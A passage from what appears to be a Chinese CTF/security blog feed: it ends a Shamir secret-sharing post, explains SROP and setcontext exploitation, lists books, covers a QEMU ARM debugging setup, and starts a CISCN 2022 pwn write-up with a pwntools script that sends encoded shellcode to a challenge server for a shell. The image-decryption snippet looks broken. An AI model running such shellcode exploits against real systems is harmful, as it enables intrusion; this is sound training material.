class="hljs-built_in">round</span>(Decimal(<span class="hljs-built_in">sum</span>),<span class="hljs-number">0</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,<span class="hljs-built_in">sum</span>)<br></code></pre></td></tr></table></figure><h4 id="运行示范"><a href="#运行示范" class="headerlink" title="运行示范"></a>运行示范</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[loorain@ubuntu] - [~/crypto/shamir] - [2304]shamir<br>└─[$] python3 shamir.py                                                                                                                                                                                             [20:33:27]<br>before: 31298123678<br>ENCRYPTING.......<br>share:( 385490 , 19613871609040056923504678528 )<br>share:( 208439 , 1676593182288704748621405212 )<br>share:( 111980 , 139661059121519203627546778 )<br>share:( 287787 , 6092505271995476798344376612 )<br>share:( 57978 , 10036212148635231635583656 )<br>share:( 8027 , 3687858811716396682052 )<br>share:( 640969 , 149919642500298401999699916572 )<br>share:( 444105 , 34550423234050839227167648028 )<br>DECRYPTING......<br>key:( 444105 , 34550423234050839227167648028 )<br>key:( 111980 , 139661059121519203627546778 )<br>key:( 208439 , 1676593182288704748621405212 )<br>key:( 287787 , 6092505271995476798344376612 )<br>key:( 385490 , 19613871609040056923504678528 )<br>after: 31298123800<br></code></pre></td></tr></table></figure><h2 id="图像加密隐写"><a href="#图像加密隐写" class="headerlink" title="图像加密隐写"></a>图像加密隐写</h2><blockquote><p>这里用0-255的矩阵模拟灰度图像</p></blockquote><h3 id="加密过程-1"><a href="#加密过程-1" class="headerlink" title="加密过程"></a>加密过程</h3><p><img src="/img/article/shamir/cry.png" alt="加密示意图"></p><p>随机生成 O 和 S，并计算 d 和 si</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">S_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>))<br>O_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>Q_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>m = number.getPrime(<span class="hljs-number">4</span>) <span class="hljs-comment">#随机生成一个素数m</span><br><br>d = O_img % m<br>S_i = S_img % m<br></code></pre></td></tr></table></figure><p>生成Q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">20</span>):<br>        Q_img[i,j] = math.floor(O_img[i,j] / m) * m<br></code></pre></td></tr></table></figure><p>生成y &#x3D; f(x),求得y与Q相加的到n个Oi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">O_i = []<br><span class="hljs-comment">##生成y = f(x),求得y与Q相加的到n个Oi</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>    key = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            y += S_i[i,j]* (key ** (i*<span class="hljs-number">10</span>+j))<br>    y += d[n] * (key ** (i*<span class="hljs-number">10</span>+j))<br>    O_i.append((Q_img + y)) <br></code></pre></td></tr></table></figure><h3 id="解密过程-1"><a href="#解密过程-1" class="headerlink" title="解密过程"></a>解密过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    Q_img.append((O_i[i, <span class="hljs-number">0</span>] // m) * m)<br>    so1.append(d[i] - (O_i[i, <span class="hljs-number">0</span>] // m) * m)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d.append(Q_img[i])<br>sol = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d1 = np(<span class="hljs-number">0</span>,m,(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>)) <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            d1[j, k] = S_img[i, j]**k<br>    sol.append(d1.solve_right(O_img[i])[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    <span class="hljs-keyword">assert</span> sol[i]&gt;m<br>solve = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    solve.append(so1[i]+Q_img[i])<br><span class="hljs-built_in">print</span>(solve == d)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>setcontext &amp; SROP</title>
    <link href="/2022/06/05/srop/"/>
    <url>/2022/06/05/srop/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>SROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究<strong>Framing Signals — A Return to Portable Shellcode</strong> 其中相关的 paper 以及如下：<br><a href="https://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">paper</a></p></blockquote><h2 id="机制详解"><a href="#机制详解" class="headerlink" title="机制详解"></a>机制详解</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/img/article/srop/srop1.png" alt="Untitled"></p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 <code>sigreturn</code> 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 <code>ucontext</code> 以及 <code>siginfo</code> 这一段为 <strong>Signal Frame</strong>。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 <code>sigreturn</code> 代码。</li><li><code>signal handler</code> 返回后，内核为执行 <code>sigreturn</code> 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 <code>sigreturn</code> 的调用号为 77，64 位的系统调用号为 15。</li></ol><p><img src="/img/article/srop/srop2.png" alt="Untitled"></p><p>上述谈到的从栈中POP出寄存器内容的过程由 <code>setcontext</code> 函数实现，如下图所示：</p><p><img src="/img/article/srop/srop3.png" alt="Untitled"></p><p>我们可以看到，从指令<code>mov rsp, [rdi+0A0h]</code>开始，便是一连串对于寄存器的恢复操作。而且结构由Signal Frame结构体实现，以下是结构源码</p><p><strong>X86</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>X64</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a>直接getshell</h3><p><strong>示意图</strong></p><p><img src="/img/article/srop/srop4.png" alt="Untitled"></p><p>我们可以直接在栈上伪造Signal Frame，利用syscall(0xF)来触发对于伪造寄存器的恢复，在<code>setcontext</code> 执行完毕后，便会getshell（或利用栈转移到其他地址也可以，但无论怎样都要保证在syscall时，rsp需指向Fake Frame 的开头)</p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>在上面直接getshell的基础上，我们可以自然的想到，通过不断伪造sigframe可以实现类似ROP的效果，只需要将其中rsp控制到下一个fakeframe的开头,rip加上ret即可。</p><p><strong>示意图</strong></p><p><img src="/img/article/srop/srop5.png" alt="Untitled"></p><h3 id="栈转移"><a href="#栈转移" class="headerlink" title="栈转移"></a>栈转移</h3><p>由于其可以轻易的控制几乎所有寄存器的值，栈转移这样的操作也可以轻松实现</p><h3 id="堆中直接利用setcontext"><a href="#堆中直接利用setcontext" class="headerlink" title="堆中直接利用setcontext"></a>堆中直接利用setcontext</h3><p>在面对堆题目时，我们很难直接在栈上构造内容并且控制rsp指向frame开头。此时可以直接通过劫持hook为<code>setcontext+53</code> 处(<strong>mov rsp, [rdi+0A0h]</strong>)，直接触发对于寄存器的一系列pop操作。且由于free时，rip指向chunk的mem域，那么我们只需要在将要free的chunk里写上Fake Frame，并合理控制与rip的距离即可。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>平台题目SROP、 ciscn 2021 silverwolf</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>我的必读书目表(仍在更新)</title>
    <link href="/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/"/>
    <url>/2022/06/05/%E3%80%8A%E6%A0%BC%E8%B0%83%EF%BC%9A%E7%A4%BE%E4%BC%9A%E7%AD%89%E7%BA%A7%E4%B8%8E%E7%94%9F%E6%B4%BB%E5%93%81%E5%91%B3%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="《格调：社会等级与生活品味》"><a href="#《格调：社会等级与生活品味》" class="headerlink" title="《格调：社会等级与生活品味》"></a>《格调：社会等级与生活品味》</h2><blockquote><p>上世纪末期美国社会结构，对于现在的我们仍有许多警醒之处。</p></blockquote><hr><h2 id="《加速》"><a href="#《加速》" class="headerlink" title="《加速》"></a>《加速》</h2><blockquote><p>本书讲解了现代社会中时间结构的改变，深入的揭示了现代社会中许多现象的本质原因。</p></blockquote><hr><h2 id="《新异化的诞生》"><a href="#《新异化的诞生》" class="headerlink" title="《新异化的诞生》"></a>《新异化的诞生》</h2><blockquote><p>社会加速批判理论大纲，辩证的思考当代人们的生活。</p></blockquote><hr><h2 id="《深入理解计算机系统》"><a href="#《深入理解计算机系统》" class="headerlink" title="《深入理解计算机系统》"></a>《深入理解计算机系统》</h2><blockquote><p>计算机底层原理,学计算机不读CSAPP，等于没学（doge）。</p></blockquote><hr><h2 id="《C-反汇编与逆向分析技术揭秘》"><a href="#《C-反汇编与逆向分析技术揭秘》" class="headerlink" title="《C++反汇编与逆向分析技术揭秘》"></a>《C++反汇编与逆向分析技术揭秘》</h2><blockquote><p>本书既是一本全面而系统地讲解反汇编与逆向分析技术的安全类专著，又是一部深刻揭示C++内部工作机制的程序设计类著作。</p></blockquote><hr><h2 id="《高级编译器设计与实现》"><a href="#《高级编译器设计与实现》" class="headerlink" title="《高级编译器设计与实现》"></a>《高级编译器设计与实现》</h2><blockquote><p>本书业内俗称“鲸书”，它是编译器领域最为经典的三本书之一，但内容更突出编译器的后端优化部分。</p></blockquote><hr><h2 id="《乌合之众》"><a href="#《乌合之众》" class="headerlink" title="《乌合之众》"></a>《乌合之众》</h2><blockquote><p>我们作为独立的个人，如何在纷纷扰扰的信息社会中保持冷静，不被乌合之众所裹挟，辩证地读完这本书，保持独立的思考，相信你能有所收获。</p></blockquote><hr>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>QEMU &amp; arm 简易pwn环境搭建</title>
    <link href="/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/05/QEMU%20&amp;%20arm%20%E7%AE%80%E6%98%93pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>填坑了，填坑了！学了堆之后很久没有学新东西了，来入门下arm架构下的PWN，为国赛打一点基础。</p></blockquote><h2 id="环境搭建-Ubuntu-20-04"><a href="#环境搭建-Ubuntu-20-04" class="headerlink" title="环境搭建(Ubuntu 20.04)"></a>环境搭建(Ubuntu 20.04)</h2><h3 id="安装QEMU"><a href="#安装QEMU" class="headerlink" title="安装QEMU"></a>安装QEMU</h3><blockquote><p>QEMU是一种通用的开源计算机仿真器和虚拟器。QEMU共有两种操作模式<br><strong>全系统仿真</strong>：能够在任意支持的架构上为任何机器运行一个完整的操作系统<br><strong>用户模式仿真</strong>：能够在任意支持的架构上为另一个Linux&#x2F;BSD运行程序 因此我们可以在linux操作系统中安装它，然后用它来调试其它架构平台的程序。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##首先安装qemu</span><br>sudo apt update<br>sudo apt install qemu<br></code></pre></td></tr></table></figure><p>安装好后可以用tab补全看看是否正确安装。在安装qemu后，对于静态链接的arm程序就已经可以直接运行了，使用命令<code>qemu-arm prog</code>运行32位的arm程序，其中prog指代程序名,对于64位程序使用<code>qemu-aarch64</code>但对于动态链接的程序还是无法正常运行，此时需要安装对应架构的动态链接库才可以正常运行。</p><p><img src="/img/article/qemu-arm/qemu.png" alt="Untitled"></p><h3 id="安装动态链接库"><a href="#安装动态链接库" class="headerlink" title="安装动态链接库"></a>安装动态链接库</h3><p>我们可以使用如下命令来搜索可安装的动态链接库。这里我们以64位为例，安装debug版本的libc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##搜索libc</span><br>sudo apt search <span class="hljs-string">&quot;libc6&quot;</span> | grep arm<br><span class="hljs-comment">##安装libc</span><br>sudo apt install libc6-dbg-arm64-cross<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu2.png" alt="Untitled"></p><p>安装完后，在<code>/usr</code>目录下会出现<code>aarch64-linux-gnu</code>这个文件夹，该文件夹即对应刚安装好的arm64位libc库，之后我们使用下面的命令指定arm程序的动态链接器，即可运行程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./prog<br><span class="hljs-comment">## -g 代表为程序运行分配的进程端口号，一般用于gdb调试，不填时系统自动分配</span><br><span class="hljs-comment">## -L 代表动态链接库的文件夹地址，静态链接程序可以不需要</span><br></code></pre></td></tr></table></figure><p><code>qemu-arm</code>指的是<strong>arm32架构</strong>，用这个命令来运行32位的arm程序，而<code>qemu-aarch64</code>对应的才是<strong>arm64位架构的程序</strong>，上面两者默认都是小端程序；<code>qemu-armeb</code>用来运行<strong>大端的arm程序</strong>。当然在<strong>上面安装包截图中显示的是arm64，其实和aarch64指的是同一种体系结构，只不过命名略有不同</strong>。</p><h2 id="使用gdb-multiarch进行调试"><a href="#使用gdb-multiarch进行调试" class="headerlink" title="使用gdb-multiarch进行调试"></a>使用gdb-multiarch进行调试</h2><p>首先使用如下命令安装gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install gdb-multiarch<br></code></pre></td></tr></table></figure><p>以平台上的ez-arch为例，我们先使用qemu启动程序，并为其分配一个端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./stack<br></code></pre></td></tr></table></figure><p>使用另外一个终端，打开qemu-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[loorain@ubuntu] - [~/dest0g3-520/ez-aarch] - [1568]<br>└─[$] sudo gdb-multiarch                                                                             [22:22:12]<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> architecture aarch64<br>The target architecture is assumed to be aarch64<br>pwndbg&gt; target remote localhost:12345<br>Remote debugging using localhost:12345<br>warning: No executable has been specified and target does not support<br>determining executable automatically.  Try using the <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu3.png" alt="Untitled"></p><p>另外在pwntools中，我们可以使用如下代码来动态调试程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/aarch64-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./stack&quot;</span>])<br><span class="hljs-comment">##32arm只需要替换指令为qemu-arm，并更换对应的动态链接库</span><br></code></pre></td></tr></table></figure><p><strong>注意：不进行调试时不建议使用</strong><code>-p</code><strong>不然可能会导致程序停滞，只能等待gdb链接</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【CISCN2022】初赛PWN部分writeup</title>
    <link href="/2022/06/04/ciscn2022/"/>
    <url>/2022/06/04/ciscn2022/</url>
    
    <content type="html"><![CDATA[<h1 id="login-normal"><a href="#login-normal" class="headerlink" title="login-normal"></a>login-normal</h1><p>题如其名，一道简单的签到题目，比赛被打烂了。主要在于代码分析，还有可打印shellcode的利用。这里我用的是github上一个大佬的项目AE64，可以用来生成可打印的shellcode，相当好用，强推,链接放在这里。</p><blockquote><p> <a href="https://github.com/veritas501/ae64">veritas501&#x2F;ae64: basic amd64 alphanumeric shellcode encoder (github.com)</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># io = process(&#x27;./login&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;59.110.105.63&#x27;</span>, <span class="hljs-number">29289</span>)<br>payload = <span class="hljs-string">b&#x27;msg:ro0t\r\nopt:1\r\n&#x27;</span><br><br>io.sendline(payload)<br><br>sc = AE64()<br><br>shellocde = sc.encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;rdx&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;msg:&#x27;</span>+shellocde+<span class="hljs-string">b&#x27;\r\nopt:2\r\n&#x27;</span><br><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h1><p> 一道堆题目，比赛结束一个多小时才勉强做出来，非常可惜。主要还是不了解新libc的一些进制了解，临时学了下面这篇文章，才有个初步了解。建议先看完这篇文章，再来看我的wp。</p><blockquote><p> <a href="https://zhuanlan.zhihu.com/p/136983333">Heap Exploit v2.31 | 最新堆利用技巧，速速查收 - 知乎 (zhihu.com)</a><br> <a href="http://blog.nsfocus.net/glibc-234/">浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.net)</a></p></blockquote><h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><p>简单看了伪代码后主要有如下几个重点</p><ul><li>free之后没有置空，存在UAF漏洞，可以通过show泄露freechunk的内容</li></ul><p><img src="https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png" alt="img"></p><ul><li><p>没有chunk编辑函数，只能在malloc的时候编辑chunk内容，即无法修改tcache的flag内容。</p></li><li><p>有两个全局变量限制了malloc和free的次数，free仅能11次，malloc次数很多不用太担心。</p></li><li><p>每个chunk的size被限制在0x40。</p></li></ul><p><img 